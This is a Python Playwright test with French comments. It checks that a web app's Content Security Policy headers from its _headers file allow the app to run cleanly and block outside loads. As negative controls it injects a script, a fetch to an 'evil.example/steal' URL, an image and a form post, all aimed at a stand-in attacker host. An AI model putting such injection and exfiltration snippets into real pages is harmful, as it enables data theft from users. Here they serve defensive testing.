import os,sys,threading,http.server,socketserver,functools
sys.path.insert(0,os.path.dirname(os.path.abspath(__file__)))
from common import *
from playwright.sync_api import sync_playwright
# Vérifie les en-têtes de sécurité du fichier _headers : l'application fonctionne sans violation, et ce qui sort de la liste est bloqué.
def lire_entetes():
    h={};dans=False
    for l in open(os.path.join(ROOT,"_headers"),encoding="utf-8"):
        if l.startswith("#") or not l.strip(): continue
        if not l.startswith(" "): dans=l.strip() in ("/index.html","/*"); continue
        if dans:
            k,v=l.strip().split(":",1);h[k.strip()]=v.strip()
    return h
ENT=lire_entetes()
class H(http.server.SimpleHTTPRequestHandler):
    def end_headers(self):
        for k,v in ENT.items(): self.send_header(k,v)
        super().end_headers()
    def log_message(self,*a): pass
srv=socketserver.TCPServer(("127.0.0.1",0),functools.partial(H,directory=ROOT));port=srv.server_address[1]
threading.Thread(target=srv.serve_forever,daemon=True).start()
stub=r"""window.__log=[];window.supabase={createClient:()=>({auth:{getSession:async()=>({data:{session:null}}),onAuthStateChange:()=>({})},
 rpc:(n,a)=>{window.__log.push([n,a]);return Promise.resolve({data:(window.__rpc||{})[n]??(n==='publish_week'?3:null),error:null})},
 from:t=>{let f=[],one=false;const b={select(){return b},order(){return b},range(){return b},limit(){return b},neq(){return b},eq(k,v){f.push(r=>String(r[k])===String(v));return b},gte(k,v){f.push(r=>String(r[k])>=v);return b},lte(k,v){f.push(r=>String(r[k])<=v);return b},in(k,v){f.push(r=>v.includes(r[k]));return b},
  maybeSingle(){one=true;return b},single(){one=true;return b},insert(x){window.__log.push(['ins',t,x]);return b},update(x){window.__log.push(['upd',t,x]);return b},delete(){return b},
  then(res){let d=(window.__tb[t]||[]).filter(r=>f.every(fn=>fn(r)));res({data:one?(d[0]||null):d,error:null})}};return b}})};"""
viol=[]
with sync_playwright() as p:
    br=launch(p);pg=br.new_context(viewport={'width':1200,'height':900}).new_page()
    pg.on("pageerror",lambda e:print("ERR",e))
    pg.on("console",lambda m:viol.append(m.text) if "Content Security Policy" in m.text or "Refused to" in m.text else None)
    def h(r,req):
        u=req.url
        if "supabase-js" in u: r.fulfill(body=stub,content_type="application/javascript")
        elif "jspdf.umd" in u: r.fulfill(path=LIB+"jspdf.umd.min.js",content_type="application/javascript")
        elif "autotable" in u: r.fulfill(path=LIB+"jspdf.plugin.autotable.min.js",content_type="application/javascript")
        elif u.startswith("http://127.0.0.1"): r.continue_()
        elif "evil.example" in u: r.abort()
        else: r.fulfill(body="",content_type="text/css" if "css" in u else "application/javascript")
    pg.route("**/*",h);pg.goto(f"http://127.0.0.1:{port}/.index-test.html");pg.wait_for_timeout(1500)
    ecran_connexion=pg.locator("form#loginForm").count()==1
    pg.evaluate("""()=>{window.__tb={schedule_sessions:[],absence_requests:[],availability_weeks:[],published_weeks:[],attendance_records:[],teacher_availability:[],
        faculties:[{id:1,code:'F',name:'Faculté X',short_name:'X'}],postes:[{id:1,name:'Professeur',roles:['professeur'],scope:'faculte',sort:1}]};
      S.sched={...SCHED_DEFAULT};S.roles=[{role:'professeur',faculty_id:1}];S.teacher={id:1,first_name:'Samba',last_name:'Ba'};S.user={id:'u',email:'p@x',user_metadata:{full_name:'Samba Ba'}};S.annonces=[];S.myPoste=1;S.postes=window.__tb.postes;S.year='2026-2027';
      return loadFacs().then(()=>{S.fac=1;S.tab='accueil';return renderShell()})}""")
    pg.wait_for_timeout(600);pg.click("details.menu summary");pg.wait_for_timeout(200)
    pdf_ok=pg.evaluate("()=>{const d=new jspdf.jsPDF();d.text('test',10,10);return d.output('blob').size>500}")
    pg.wait_for_timeout(300)
    legit=list(viol);viol.clear()
    # contrôles négatifs : tout cela doit être bloqué par la politique
    pg.evaluate("""()=>{const s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s);
      fetch('https://evil.example/steal').catch(()=>{});const i=new Image();i.src='https://evil.example/p.png';
      const f=document.createElement('form');f.action='https://evil.example/post';document.body.appendChild(f);try{f.submit()}catch(e){}}""")
    pg.wait_for_timeout(800)
    blocs=list(viol)
    br.close()
print("écran de connexion affiché :",ecran_connexion)
print("PDF généré :",pdf_ok)
print("violations de l'application (attendu 0) :",len(legit),legit[:3])
print("blocages des contrôles négatifs (attendu >= 3) :",len(blocs))
